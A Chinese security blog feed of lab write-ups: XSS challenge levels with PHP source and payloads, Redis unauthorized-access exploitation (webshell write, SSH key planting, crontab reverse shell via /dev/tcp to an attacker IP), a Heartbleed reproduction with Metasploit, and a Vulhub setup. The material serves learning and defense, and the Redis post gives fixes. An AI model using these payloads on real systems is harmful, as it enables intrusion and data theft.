class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>只是对空格，<code>script</code>，<code>/</code> 进行了过滤，不使用<code>script</code>，并且用其他方式代替空格即可成功绕过。</p><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><h3 id="属性空格逃逸"><a href="#属性空格逃逸" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p><img src="/2019/05/20/XSS挑战之旅/1558273349908.png" alt="1558273349908"></p><p>可以看到可控的参数有两个，试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/1558273500807.png" alt="1558273500807"></p><p><code>&lt;&gt;</code>，<code>&quot;</code>被过滤，最后试出来个哈哈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558273987115.png" alt="1558273987115"></p><p>那这样应该也能行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558274123391.png" alt="1558274123391"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>虽然参数都加上了实体化转义，但是没有引号闭合属性，所以添加空格就可以写个新属性啦哈哈</p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><h3 id="属性空格逃逸-1"><a href="#属性空格逃逸-1" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p>Excuse me ???，上把的payload都没变</p><p><img src="/2019/05/20/XSS挑战之旅/1558274541848.png" alt="1558274541848"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我瞅了半天，才发现只是引用的swf文件名不一样。。好吧，下一关</p><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这关试了怎么试都跳不出了属性的值</p><p><img src="/2019/05/20/XSS挑战之旅/1558313314215.png" alt="1558313314215"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf03.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：这里和上两关</p><p>的区别就在于有了双引号来闭合属性的值，又因为使用了实体化转义的函数，双引号无法逃脱出去。所以这关考察的应该是Flash XSS，参考了<a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">D4rk3r</a>这位大佬的文章</p><p>使用工具<a href="https://github.com/jindrapetrik/jpexs-decompiler" target="_blank" rel="noopener">jpexs-decompiler</a></p><p>首先找到getURL函数</p><p><img src="/2019/05/20/XSS挑战之旅/1558315194981.png" alt="1558315194981"></p><p>然后发现了version参数会被传入loc4变量中，即sIFR的内容中</p><p><img src="/2019/05/20/XSS挑战之旅/1558315623256.png" alt="1558315623256"></p><p>但是根据第一张图中getURL只在内容为link时打开，所以再看下contentIsLink()函数</p><p><img src="/2019/05/20/XSS挑战之旅/1558316052078.png" alt="1558316052078"></p><p>得知构造<code>&lt;a&gt;&lt;/a&gt;</code>标签来传值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558316206643.png" alt="1558316206643"></p><p>注意：我的火狐浏览器加载不出来flash，这里用的chrome可以加载</p><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><h3 id="Flash-XSS-1"><a href="#Flash-XSS-1" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这一关和上关一样，考察Flash XSS</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf04.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网上说是<strong>zeroclipboard.swf</strong> 的XSS，其主要的功能是复制内容到剪切板，中间由flash进行中转保证兼容主流浏览器，具体做法就是使这个透明的flash漂浮在复制按钮之上，下面给出xss poc代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id</span><br><span class="line">&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)//%26width%26height</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558343919410.png" alt="1558343919410"></p><p>看一下flash代码，看不懂了 (￣_￣|||)，就先记录一下payload吧。</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p><p><a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">XSS挑战之旅–游戏闯关</a></p><p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">【巨人肩膀上的矮子】XSS挑战之旅—游戏通关攻略（更新至18关）</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权访问漏洞</title>
      <link href="/2019/05/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Redis介绍"><a href="#一、Redis介绍" class="headerlink" title="一、Redis介绍"></a>一、Redis介绍</h2><p><code>Redis</code>是一个开源的，基于<code>ANSI C语言</code>开发、支持网络、可基于内存亦可持久化的日志型的高性能的Key-Value数据库系统</p><h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><p> Redis未授权访问漏洞即Redis匿名访问漏洞，是由于 <code>Redis</code>服务本身的特性及其运维不当造成的。</p><p><code>Redis</code>的默认配置文件中，会绑定 <code>0.0.0.0:6379</code>，这样 <code>Redis</code>会监听一切 <code>IP</code>，接收一切 <code>IP</code>的请求。如果没有采用添加防火墙规则等安全策略屏蔽非信任来源 <code>IP</code>访问，就会使 <code>Redis</code>服务暴露在公网，被任意用户进行登录。</p><p><code>Redis</code>默认没有设置密码认证，没有进行相应的密码验证会导致任意 用户免密登录 <code>Redis</code>，从而读取 <code>Redis</code>的数据、篡改 <code>Redis</code>的数据或者更高危的操作。</p><a id="more"></a><h2 id="二、Redis安装"><a href="#二、Redis安装" class="headerlink" title="二、Redis安装"></a>二、Redis安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get update</span><br><span class="line">$sudo apt-get install redis-server</span><br></pre></td></tr></table></figure><h2 id="二、Redis服务器配置"><a href="#二、Redis服务器配置" class="headerlink" title="二、Redis服务器配置"></a>二、Redis服务器配置</h2><p>修改配置文件 /opt/redis/redis.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># bind 127.0.0.1#监听任意ip</span><br><span class="line">protected-mode no#关闭保护模式</span><br></pre></td></tr></table></figure><p>启动redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf #重新加载配置文件</span><br></pre></td></tr></table></figure><h2 id="三、Redis客户端连接"><a href="#三、Redis客户端连接" class="headerlink" title="三、Redis客户端连接"></a>三、Redis客户端连接</h2><p>客户端（本地宿主机）连接redis服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure><h2 id="四、基础命令"><a href="#四、基础命令" class="headerlink" title="四、基础命令"></a>四、基础命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info#版本信息，服务器信息等</span><br><span class="line">set name &quot;hi&quot;#设置变量</span><br><span class="line">get name #取值</span><br><span class="line">flushall #删除数据库（一般情况下不要用！）</span><br><span class="line">keys * #查看所有的键</span><br><span class="line">CONFIG GET dir/dbfilename#获取默认的Reids目录和rdb的文件名，在修改前先获取，然后走的时候再恢复</span><br><span class="line">CONFIG SET dir/dbfilename#修改默认的Reids目录和rdb的文件名</span><br><span class="line">save#执行同步保存操作，将当前Redis实例的所有数据快照(snapshot)以RDB文件的形式保存到硬盘。</span><br><span class="line">bgsave#fork一个子进程来创建RDB文件，父进程可以继续处理命令请求。</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>save：会阻塞redis服务器进程，直到创建RDB文件完毕为止；（在此期间进程不能处理任何请求）<br>bgsave：命令执行之后立即返回 OK ，然后Redis fork 出一个新子进程，原来的Redis 进程(父进程)继续处理客户端请求，而子进程则负责将数据保存到磁盘，然后退出</p></blockquote><h2 id="五、攻击利用方式"><a href="#五、攻击利用方式" class="headerlink" title="五、攻击利用方式"></a>五、攻击利用方式</h2><h3 id="1-写Webshell"><a href="#1-写Webshell" class="headerlink" title="1. 写Webshell"></a>1. 写Webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET dir /var/www/#将rdb文件保存在/var/www/中</span><br><span class="line">CONFIG SET dbfilename redis.php#将rdb文件名修改为redis.php</span><br><span class="line">set shell &quot;&lt;?php phpinfo();?&gt;&quot;#往redis.php中写木马</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><h3 id="2-ssh配置免密登录"><a href="#2-ssh配置免密登录" class="headerlink" title="2. ssh配置免密登录"></a>2. ssh配置免密登录</h3><p>条件：</p><ul><li>Redis服务使用ROOT账号启动 </li><li>服务器开放SSH服务，而且允许密钥登录，即可远程写入一个公钥，直接登录远程服务器</li></ul><p>先在渗透主机上生成 <code>ssh</code>的私钥与公钥：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa//一直回车即可</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; hack.txt# 保存公钥到hack.txt中</span><br><span class="line">cat hack.txt | redis-cli -h 192.168.1.10 -p 6379 -x set hack # 把公钥写入到redis主机</span><br></pre></td></tr></table></figure><p>登陆访问redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure><p>修改RDB存储位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><p>ssh远程连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.13</span><br></pre></td></tr></table></figure><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3. 反弹shell"></a>3. 反弹shell</h3><p>crontab周期性执行任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab </span><br><span class="line">-l#查看当前任务</span><br><span class="line">-r#删除任务</span><br><span class="line">-e#编辑</span><br><span class="line">6部分：分钟 小时 天 月 星期 命令/脚本</span><br><span class="line">*/2 * * * * echo &quot;this is test&quot; &gt;&gt;/tmp/backup</span><br></pre></td></tr></table></figure><p>查看当前任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/spool/cron/</span><br><span class="line">ls</span><br><span class="line">cat root</span><br><span class="line">该文件内容等同于</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p>写入crontab定时任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xx &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><p>攻击者服务端开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 7999</span><br></pre></td></tr></table></figure><p><img src="/2019/05/15/Redis未授权访问漏洞/1557925558674.png" alt="1557925558674"></p><h2 id="六、修复"><a href="#六、修复" class="headerlink" title="六、修复"></a>六、修复</h2><h4 id="低权限运行Redis服务"><a href="#低权限运行Redis服务" class="headerlink" title="低权限运行Redis服务"></a>低权限运行Redis服务</h4><p>避免使用<code>root</code>用户身份启动<code>Redis</code>服务，选择权限较低的用户运行<code>rides</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure><h4 id="禁止命令"><a href="#禁止命令" class="headerlink" title="禁止命令"></a>禁止命令</h4><p>通过修改配置文件来禁止一些高风险的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">...</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="添加密码认证"><a href="#添加密码认证" class="headerlink" title="添加密码认证"></a>添加密码认证</h4><p>通过配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">requirepass PASSWORD</span><br></pre></td></tr></table></figure><p>也可以通过 <code>Redis</code>的命令行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set requirepass PASSWORD</span><br></pre></td></tr></table></figure><h4 id="禁止外网访问"><a href="#禁止外网访问" class="headerlink" title="禁止外网访问"></a>禁止外网访问</h4><p>通过防火墙等配置来禁止外网访问。</p><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p><code>Redis</code>匿名访问漏洞由不安全的运维配置引起的，作为配置 <code>Redis</code>的开发人员或运维人员一定要有一定的安全意识，才能更好的实现真正的安全。</p><h2 id="八、参考文章："><a href="#八、参考文章：" class="headerlink" title="八、参考文章："></a>八、参考文章：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486083&amp;idx=1&amp;sn=666450400463d4e5859dc5cc44e1c125&amp;chksm=fbf790f3cc8019e5cf5bc18d9613cdf753843ff168287aa02a7ffbbf10b1de14adda5014efd3&amp;mpshare=1&amp;scene=1&amp;srcid=0515suowq2IQTtgTS6p7CQYB&amp;key=6d5a213b9d007c25d3d2231d6bd6b4201c5288fd64eedafa935ba639a2fa4d47aeee0e6b412b4bf9d5bfa0b2a643faab2c1a323181f0b350c9abc93031a416d1ec1ba77485db2a58ba65a9d010cb0aa2&amp;ascene=1&amp;uin=MTU1MTA3MzA3OQ%3D%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=i1OV73MX6FUakKhfB6AFSufopQjomZv%2FYeYRGSAQ3oprOhX%2BLJdD5rJJCyLpPXYG" target="_blank" rel="noopener">Redis匿名访问漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2014-0160-心脏滴血漏洞</title>
      <link href="/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><p><strong>CVE ID</strong>:</p><p>CVE-2014-0160</p><p><strong>漏洞范围</strong>：</p><p>OpenSSL1.0.1</p><p><strong>漏洞成因</strong>：</p><p>Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p><a id="more"></a><p><strong>漏洞危害</strong>：</p><p>如同漏洞成因所讲，我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等。</p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><p>环境： bee-box虚拟机(已集成该漏洞环境)<br>bee-box虚拟机下载地址：<a href="https://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">链接</a></p><h3 id="1-使用工具进行利用"><a href="#1-使用工具进行利用" class="headerlink" title="1. 使用工具进行利用"></a>1. 使用工具进行利用</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><ol><li><p>首先确定目标和端口信息</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556676583087.png" alt="1556676583087"></p><p>可以看到存在漏洞的端口为8443</p></li><li><p>使用nmap脚本进行漏洞检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.224.131</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556676900297.png" alt="1556676900297"></p><p>可以看到该漏洞存在</p></li></ol><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><ol><li><p>使用msf的exp进行漏洞利用</p><ol><li><p>打开msfconsole</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677575168.png" alt="1556677575168"></p></li><li><p>查找heartbleed模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677615995.png" alt="1556677615995"></p></li><li><p>使用第一个模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssl/openssl_heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677661603.png" alt="1556677661603"></p><p>第二个模块是用来</p></li><li><p>查看设置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshow options</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677730237.png" alt="1556677730237"></p></li><li><p>设置RHOST，RPORT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.11.59</span><br><span class="line">set RPORT 443</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677783208.png" alt="1556677783208"></p></li><li><p>设置VERBOSRE，值为true才能看到泄漏的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">set VERBOSE true</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677911981.png" alt="1556677911981"></p></li><li><p>执行paload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>如果有人正在登陆该web应用，可能获取到账号密码等信息</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556684475023.png" alt="1556684475023"></p><p>没有获取到数据是因为没有人登陆该应用或者登陆较少</p><p>下图是之前获取到数据的示例</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556679300981.png" alt="1556679300981"></p></li></ol></li></ol><h3 id="2-使用python脚本"><a href="#2-使用python脚本" class="headerlink" title="2. 使用python脚本"></a>2. 使用python脚本</h3><h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/poc.py" target="_blank" rel="noopener">PoC</a></h4><p>修改 <code>poc.py</code> 中 <code>check</code> 函数的地址和端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">check(&apos;192.168.59.103&apos;, 443)</span><br></pre></td></tr></table></figure><p>然后执行poc.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py</span><br></pre></td></tr></table></figure><p>如果看到 <code>Heartbleed OpenSSL</code> 则代表存在漏洞。</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/exp.py" target="_blank" rel="noopener">Exp</a></h4><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 192.168.59.103</span><br></pre></td></tr></table></figure><p>读取到的信息在当前目录下的 <code>result.txt</code> 内。</p><blockquote><p>具体使用参数请使用 <code>python exp.py -h</code></p></blockquote><p>参考链接：</p><p><a href="https://www.jianshu.com/u/13c720cf85fc" target="_blank" rel="noopener">ch3ckr</a>： <a href="https://www.jianshu.com/p/08600e2f4530" target="_blank" rel="noopener">https://www.jianshu.com/p/08600e2f4530</a></p><p><a href="https://github.com/Medicean" target="_blank" rel="noopener">Medicean</a>：<a href="https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Docker+Vulhub搭建漏洞测试靶场</title>
      <link href="/2019/04/28/%E4%BD%BF%E7%94%A8Docker-Vulhub%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/"/>
      <url>/2019/04/28/%E4%BD%BF%E7%94%A8Docker-Vulhub%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Vulhub是一个基于<code>docker</code>和<code>docker-compose</code>的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><a id="more"></a><h2 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>配置国内加速器，可以更快的拉取镜像资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure><h2 id="三、安装docker-compose"><a href="#三、安装docker-compose" class="headerlink" title="三、安装docker-compose"></a>三、安装docker-compose</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python//安装PIP</span><br><span class="line">pip install 